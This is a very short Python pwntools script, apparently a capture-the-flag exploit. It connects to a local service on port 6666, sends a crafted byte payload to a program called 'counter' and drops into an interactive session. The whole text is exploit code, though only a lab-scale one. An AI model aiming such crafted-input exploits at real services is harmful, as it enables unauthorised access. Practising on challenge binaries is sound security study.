from pwn import *

#p = process('./counter')
H,P='localhost',6666
p = remote(H,P)
payload = "\x98"*0x7+"\x99"
p.sendline(payload)
p.interactive()
